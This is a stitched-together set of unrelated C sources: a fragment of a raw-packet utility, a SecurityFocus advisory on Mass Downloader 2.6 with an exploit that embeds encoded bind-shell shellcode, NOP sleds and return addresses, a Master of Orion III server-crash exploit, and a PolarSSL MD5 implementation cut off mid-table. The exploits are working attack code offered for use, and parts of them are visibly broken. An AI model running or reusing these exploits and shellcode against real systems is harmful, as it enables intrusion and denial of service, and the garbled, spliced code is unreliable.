	sum = 0;
	while (nbytes > 1)
	{
		sum += *ptr++;
		nbytes -= 2;
	}

	if (nbytes == 1)
	{
		oddbyte = 0;	/* make sure top half is zero */
		*((u_char *) & oddbyte) = *(u_char *) ptr; /* one byte only */
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);	/* add high-16 to low-16 */
	sum += (sum >> 16);	/* add carry */
	answer = ~sum;		/* ones-complement, then truncate to 16 bits */
	return (answer);
}

unsigned int
host_convert (char *hostname)
{
	static struct in_addr i;
	struct hostent     *h;

	i.s_addr = inet_addr (hostname);
	if (i.s_addr == -1)
	{
		h = gethostbyname (hostname);
		if (h == NULL)
		{
			fprintf (stderr, "cannot resolve %s\n", hostname);
			exit (0);
		}
		bcopy (h->h_addr, (char *) &i.s_addr, h->h_length);
	}
	return i.s_addr;
}

void
usage (char *progname)
{
	printf ("\nusage: %s -s source_host -d destination_host -p destination_port (default is 80)\n\n",
		progname);
}

source: http://www.securityfocus.com/bid/31406/info

Mass Downloader is prone to a remote denial-of-service vulnerability.

Exploiting this issue allows remote attackers to crash the application and trigger denial-of-service conditions, denying further service to legitimate users. Given the nature of this issue, attackers may also be able to run arbitrary code, but this has not been confirmed.

Mass Downloader 2.6 is vulnerable; other versions may also be affected. 

#include<windows.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>




unsigned char bind_scode[] =
               "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
                "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
                "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
                "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
                "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"
                "\x42\x30\x42\x50\x42\x50\x4b\x58\x45\x54\x4e\x53\x4b\x58\x4e\x37"
                "\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x51\x4b\x48"
                "\x4f\x55\x42\x42\x41\x30\x4b\x4e\x49\x44\x4b\x48\x46\x43\x4b\x38"
                "\x41\x30\x50\x4e\x41\x53\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"
                "\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"
                "\x46\x4f\x4b\x53\x46\x35\x46\x32\x46\x30\x45\x37\x45\x4e\x4b\x48"
                "\x4f\x35\x46\x32\x41\x50\x4b\x4e\x48\x56\x4b\x38\x4e\x50\x4b\x54"
                "\x4b\x48\x4f\x55\x4e\x31\x41\x30\x4b\x4e\x4b\x38\x4e\x41\x4b\x38"
                "\x41\x30\x4b\x4e\x49\x58\x4e\x35\x46\x42\x46\x50\x43\x4c\x41\x43"
                "\x42\x4c\x46\x36\x4b\x48\x42\x34\x42\x33\x45\x38\x42\x4c\x4a\x37"
                "\x4e\x30\x4b\x48\x42\x34\x4e\x50\x4b\x48\x42\x57\x4e\x31\x4d\x4a"
                "\x4b\x38\x4a\x46\x4a\x50\x4b\x4e\x49\x50\x4b\x48\x42\x38\x42\x4b"
                "\x42\x30\x42\x50\x42\x30\x4b\x48\x4a\x36\x4e\x53\x4f\x35\x41\x33"
                "\x48\x4f\x42\x46\x48\x35\x49\x58\x4a\x4f\x43\x48\x42\x4c\x4b\x57"
                "\x42\x55\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x35\x4a\x46\x4a\x49"
                "\x50\x4f\x4c\x38\x50\x30\x47\x55\x4f\x4f\x47\x4e\x43\x56\x41\x36"
                "\x4e\x46\x43\x46\x50\x52\x45\x36\x4a\x37\x45\x36\x42\x30\x5a\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"


unsigned char user_scode[] =
               "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
                "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
                "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
                "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
                "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"
                "\x42\x30\x42\x50\x42\x50\x4b\x58\x45\x54\x4e\x53\x4b\x58\x4e\x37"
                "\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x51\x4b\x48"
                "\x4f\x55\x42\x42\x41\x30\x4b\x4e\x49\x44\x4b\x48\x46\x43\x4b\x38"
                "\x41\x30\x50\x4e\x41\x53\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"
                "\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"
                "\x46\x4f\x4b\x53\x46\x35\x46\x32\x46\x30\x45\x37\x45\x4e\x4b\x48"
                "\x4f\x35\x46\x32\x41\x50\x4b\x4e\x48\x56\x4b\x38\x4e\x50\x4b\x54"
                "\x4b\x48\x4f\x55\x4e\x31\x41\x30\x4b\x4e\x4b\x38\x4e\x41\x4b\x38"
                "\x41\x30\x4b\x4e\x49\x58\x4e\x35\x46\x42\x46\x50\x43\x4c\x41\x43"
                "\x42\x4c\x46\x36\x4b\x48\x42\x34\x42\x33\x45\x38\x42\x4c\x4a\x37"
                "\x4e\x30\x4b\x48\x42\x34\x4e\x50\x4b\x48\x42\x57\x4e\x31\x4d\x4a"
                "\x4b\x38\x4a\x46\x4a\x50\x4b\x4e\x49\x50\x4b\x48\x42\x38\x42\x4b"
                "\x42\x30\x42\x50\x42\x30\x4b\x48\x4a\x36\x4e\x53\x4f\x35\x41\x33"
                "\x48\x4f\x42\x46\x48\x35\x49\x58\x4a\x4f\x43\x48\x42\x4c\x4b\x57"
                "\x42\x55\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x35\x4a\x46\x4a\x49"
                "\x50\x4f\x4c\x38\x50\x30\x47\x55\x4f\x4f\x47\x4e\x43\x56\x41\x36"
                "\x4e\x46\x43\x46\x50\x52\x45\x36\x4a\x37\x45\x36\x42\x30\x5a"


unsigned char ra_sp2[] = "\xFF\xBE\x3F\x7E"; //massdown.dll
unsigned char ra_sp3[] = "\x7B\x30\xE4\x77"; //massdown.dll

unsigned char nops1[12]; //14115 * \x90
unsigned char nops2[2068]; //2068 * \x90

int main(int argc, char **argv)
{
    int i;
    FILE* f;
    char* ra=NULL;
    char* scode=NULL;
    printf("[+] Mass Downloader 2.6 Remote Denial of Service PoC \n");
        printf("[+] Discovered by Ciph3r  <www.expl0iters.ir>\n");
        printf("[+] Code by Ciph3r Ciph3r_blackhat[at]yahoo[dot]com\n");
    if ((argc!=3)||((atoi(argv[1])!=0)&&(atoi(argv[1])!=1))||((atoi(argv[2])!=0)&&(atoi(argv[2])!=1))){
            printf("Usage: %s target Ciph3r\n",argv[0]);
            printf("Where target is:\n");
            printf("0: winXP Pro SP2\n");
            printf("1: win2k\n")
            return EXIT_SUCCESS;
    }
for(i=0;i<12;i++) nops1[i]='\x90';
    nops1[12]='\0';
    for(i=0;i<2068;i++) nops2[i]='\x90';
    nops2[2068]='\0';
    if(atoi(argv[1])==0) ra=ra_sp2;
    else ra=ra_sp3;
    if(atoi(argv[2])==0) scode=bind_scode;
    else scode=user_scode;
    f=fopen("Ciph3r.exe","wb");
    fprintf(f,nops1,ra,nops2,scode,'\xd','\xa');
    fflush(f);
    fclose(f);
    printf("Ciph3r.exe created!\n");
    return EXIT_SUCCESS;
}
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    /*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>

void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER     "0.1"
#define PORT    25711
#define BUFFSZ  2048
#define TIMEOUT 3
#define MAX     15
#define PCK1    "gniP" "nnoC"   /* Connection Ping */ \
                "\x02\x00\x00\x00\x01\x41\x66\xFF\x08\x00\x00\x00\x00\x00"
#define PCK2    "ofnI" "trtS"   /* Start info */ \
                "\x02\x00\x02\x00\x01\x01\x00\x00\x00" \
                "\xff"          /* nickname size followed by nickname (wide chars) */ \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

#define SEND(x) tmp = htonl(sizeof(x) - 1); \
                if(send(sd, (void *)&tmp, 4, 0) \
                  < 0) std_err(); \
                if(send(sd, x, sizeof(x) - 1, 0) \
                  < 0) std_err();

#define RECV(x) for(tot = 0; tot < x; tot += tmp) { \
                    tmp = recv(sd, buff + tot, BUFFSZ - tot, 0); \
                    if(tmp < 0) std_err(); \
                    if(!tmp) break; \
                }



int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    int     sd,
            i,
            len,
            tot,
            tmp;
    u_short port = PORT;
    u_char  buff[BUFFSZ];
    struct  sockaddr_in peer;


    setbuf(stdout, NULL);

    fputs("\n"
        "Master of Orion III <= 1.2.5 server crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <server> [port(%d)]\n"
            "\n"
            "Attack:\n"
            " 1 = fast allocation exit\n"
            " 2 = multiple big nicknames crash\n"
            "\n", argv[0], PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 3) port = atoi(argv[3]);

    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s:%hu\n",
        inet_ntoa(peer.sin_addr), port);

    if(atoi(argv[1]) == 2) {
        printf("- make max %d connections sending a big nickname\n", MAX);
        for(i = 1; i <= MAX; i++) {
            printf("  Connection: %d\n", i);
            sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if(sd < 0) std_err();
            if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
              < 0) std_err();

            fputs("- send join ping\n", stdout);
            SEND(PCK1);

            RECV(4);
            len = ntohl(*(u_long *)buff);
            RECV(len);

            fputs("- send join data\n", stdout);
            SEND(PCK2);

            fputs("- check if server is crashed\n", stdout);
            if((timeout(sd) < 0) || (recv(sd, buff, BUFFSZ, 0) <= 0)) {
                fputs("\nServer IS vulnerable!!!\n", stdout);
                close(sd);
                break;
            }

            close(sd);
        }
        if(i > MAX) fputs("\nServer doesn't seem vulnerable\n", stdout);

    } else {
        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sd < 0) std_err();
        if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();

        fputs("- send BOOM data\n", stdout);
        len = 0xffffffff;   // bytes to allocate in memory
        if(send(sd, (void *)&len, 4, 0)
          < 0) std_err();

        if((timeout(sd) < 0) || (recv(sd, buff, BUFFSZ, 0) <= 0)) {
            fputs("\nServer IS vulnerable!!!\n", stdout);
        } else {
            fputs("\nServer doesn't seem vulnerable\n", stdout);
        }

        close(sd);
    }

    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2004-10-27]
/*
 *  RFC 1321 compliant MD5 implementation
 *
 *  Copyright (C) 2006-2010, Brainspark B.V.
 *
 *  This file is part of PolarSSL (http://www.polarssl.org)
 *  Lead Maintainer: Paul Bakker <polarssl_maintainer at polarssl.org>
 *
 *  All rights reserved.
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License along
 *  with this program; if not, write to the Free Software Foundation, Inc.,
 *  51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */
/*
 *  The MD5 algorithm was designed by Ron Rivest in 1991.
 *
 *  http://www.ietf.org/rfc/rfc1321.txt
 */

//#include "polarssl/config.h"
#define POLARSSL_MD5_C

#if defined(POLARSSL_MD5_C)

#include "md5.h"

#include <string.h>
#include <stdio.h>

/*
 * 32-bit integer manipulation macros (little endian)
 */
#ifndef GET_ULONG_LE
#define GET_ULONG_LE(n,b,i)                             \
{                                                       \
    (n) = ( (unsigned long) (b)[(i)    ]       )        \
        | ( (unsigned long) (b)[(i) + 1] <<  8 )        \
        | ( (unsigned long) (b)[(i) + 2] << 16 )        \
        | ( (unsigned long) (b)[(i) + 3] << 24 );       \
}
#endif

#ifndef PUT_ULONG_LE
#define PUT_ULONG_LE(n,b,i)                             \
{                                                       \
    (b)[(i)    ] = (unsigned char) ( (n)       );       \
    (b)[(i) + 1] = (unsigned char) ( (n) >>  8 );       \
    (b)[(i) + 2] = (unsigned char) ( (n) >> 16 );       \
    (b)[(i) + 3] = (unsigned char) ( (n) >> 24 );       \
}
#endif

/*
 * MD5 context setup
 */
void md5_starts( md5_context *ctx )
{
    ctx->total[0] = 0;
    ctx->total[1] = 0;

    ctx->state[0] = 0x67452301;
    ctx->state[1] = 0xEFCDAB89;
    ctx->state[2] = 0x98BADCFE;
    ctx->state[3] = 0x10325476;
}

static void md5_process( md5_context *ctx, const unsigned char data[64] )
{
    unsigned long X[16], A, B, C, D;

    GET_ULONG_LE( X[ 0], data,  0 );
    GET_ULONG_LE( X[ 1], data,  4 );
    GET_ULONG_LE( X[ 2], data,  8 );
    GET_ULONG_LE( X[ 3], data, 12 );
    GET_ULONG_LE( X[ 4], data, 16 );
    GET_ULONG_LE( X[ 5], data, 20 );
    GET_ULONG_LE( X[ 6], data, 24 );
    GET_ULONG_LE( X[ 7], data, 28 );
    GET_ULONG_LE( X[ 8], data, 32 );
    GET_ULONG_LE( X[ 9], data, 36 );
    GET_ULONG_LE( X[10], data, 40 );
    GET_ULONG_LE( X[11], data, 44 );
    GET_ULONG_LE( X[12], data, 48 );
    GET_ULONG_LE( X[13], data, 52 );
    GET_ULONG_LE( X[14], data, 56 );
    GET_ULONG_LE( X[15], data, 60 );

#define S(x,n) ((x << n) | ((x & 0xFFFFFFFF) >> (32 - n)))

#define P(a,b,c,d,k,s,t)                                \
{                                                       \
    a += F(b,c,d) + X[k] + t; a = S(a,s) + b;           \
}

    A = ctx->state[0];
    B = ctx->state[1];
    C = ctx->state[2];
    D = ctx->state[3];

#define F(x,y,z) (z ^ (x & (y ^ z)))

    P( A, B, C, D,  0,  7, 0xD76AA478 );
    P( D, A, B, C,  1, 12, 0xE8C7B756 );
    P( C, D, A, B,  2, 17, 0x242070DB );
    P( B, C, D, A,  3, 22, 0xC1BDCEEE );
    P( A, B, C, D,  4,  7, 0xF57C0FAF );
    P( D, A, B, C,  5, 12, 0x4787C62A );
    P( C, D, A, B,  6, 17, 0xA8304613 );
    P( B, C, D, A,  7, 22, 0xFD469501 );
    P( A, B, C, D,  8,  7, 0x698098D8 );
    P( D, A, B, C,  9, 12, 0x8B44F7AF );
    P( C, D, A, B, 10, 17, 0xFFFF5BB1 );
    P( B, C, D, A, 11, 22, 0x895CD7BE );
    P( A, B, C, D, 12,  7, 0x6B901122 );
    P( D, A, B, C, 13, 12, 0xFD987193 );
    P( C, D, A, B, 14, 17, 0xA679438E );
    P( B, C, D, A, 15, 22, 0x49B40821 );

#undef F

#define F(x,y,z) (y ^ (z & (x ^ y)))

    P( A, B, C, D,  1,  5, 0xF61E2562 );
    P( D, A, B, C,  6,  9, 0xC040B340 );
    P( C, D, A, B, 11, 14, 0x265E5A51 );
    P( B, C, D, A,  0, 20, 0xE9B6C7AA );
    P( A, B, C, D,  5,  5, 0xD62F105D );
    P( D, A, B, C, 10,  9, 0x02441453 );
    P( C, D, A, B, 15, 14, 0xD8A1E681 );
    P( B, C, D, A,  4, 20, 0xE7D3FBC8 );
    P( A, B, C, D,  9,  5, 0x21E1CDE6 );
    P( D, A, B, C, 14,  9, 0xC33707D6 );
    P( C, D, A, B,  3, 14, 0xF4D50D87 );
    P( B, C, D, A,  8, 20, 0x455A14ED );
    P( A, B, C, D, 13,  5, 0xA9E3E905 );
    P( D, A, B, C,  2,  9, 0xFCEFA3F8 );
    P( C, D, A, B,  7, 14, 0x676F02D9 );
    P( B, C, D, A, 12, 20, 0x8D2A4C8A );

#undef F
    
#define F(x,y,z) (x ^ y ^ z)

    P( A, B, C, D,  5,  4, 0xFFFA3942 );
    P( D, A, B, C,  8, 11, 0x8771F681 );
    P( C, D, A, B, 11, 16, 0x6D9D6122 );
    P( B, C, D, A, 14, 23, 0xFDE5380C );
    P( A, B, C, D,  1,  4, 0xA4BEEA44 );
    P( D, A, B, C,  4, 11, 0x4BDECFA9 );
    P( C, D, A, B,  7, 16, 0xF6BB4B60 );
    P( B, C, D, A, 10, 23, 0xBEBFBC70 );
    P( A, B, C, D, 13,  4, 0x289B7EC6 );
    P( D, A, B, C,  0, 11, 0xEAA127FA );
    P( C, D, A, B,  3, 16, 0xD4EF3085 );
    P( B, C, D, A,  6, 23, 0x04881D05 );
    P( A, B, C, D,  9,  4, 0xD9D4D039 );
    P( D, A, B, C, 12, 11, 0xE6DB99E5 );
    P( C, D, A, B, 15, 16, 0x1FA27CF8 );
    P( B, C, D, A,  2, 23, 0xC4AC5665 );

#undef F

#define F(x,y,z) (y ^ (x | ~z))

    P( A, B, C, D,  0,  6, 0xF4292244 );
    P( D, A, B, C,  7, 10, 0x432AFF97 );
    P( C, D, A, B, 14, 15, 0xAB9423A7 );
    P( B, C, D, A,  5, 21, 0xFC93A039 );
    P( A, B, C, D, 12,  6, 0x655B59C3 );
    P( D, A, B, C,  3, 10, 0x8F0CCC92 );
    P( C, D, A, B, 10, 15, 0xFFEFF47D );
    P( B, C, D, A,  1, 21, 0x85845DD1 );
    P( A, B, C, D,  8,  6, 0x6FA87E4F );
    P( D, A, B, C, 15, 10, 0xFE2CE6E0 );
    P( C, D, A, B,  6, 15, 0xA3014314 );
    P( B, C, D, A, 13, 21, 0x4E0811A1 );
    P( A, B, C, D,  4,  6, 0xF7537E82 );
    P( D, A, B, C, 11, 10, 0xBD3AF235 );
    P( C, D, A, B,  2, 15, 0x2AD7D2BB );
    P( B, C, D, A,  9, 21, 0xEB86D391 );

#undef F

    ctx->state[0] += A;
    ctx->state[1] += B;
    ctx->state[2] += C;
    ctx->state[3] += D;
}

/*
 * MD5 process buffer
 */
void md5_update( md5_context *ctx, const unsigned char *input, int ilen )
{
    int fill;
    unsigned long left;

    if( ilen <= 0 )
        return;

    left = ctx->total[0] & 0x3F;
    fill = 64 - left;

    ctx->total[0] += ilen;
    ctx->total[0] &= 0xFFFFFFFF;

    if( ctx->total[0] < (unsigned long) ilen )
        ctx->total[1]++;

    if( left && ilen >= fill )
    {
        memcpy( (void *) (ctx->buffer + left),
                (void *) input, fill );
        md5_process( ctx, ctx->buffer );
        input += fill;
        ilen  -= fill;
        left = 0;
    }

    while( ilen >= 64 )
    {
        md5_process( ctx, input );
        input += 64;
        ilen  -= 64;
    }

    if( ilen > 0 )
    {
        memcpy( (void *) (ctx->buffer + left),
                (void *) input, ilen );
    }
}

static const unsigned char md5_padding[64] =
{
 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
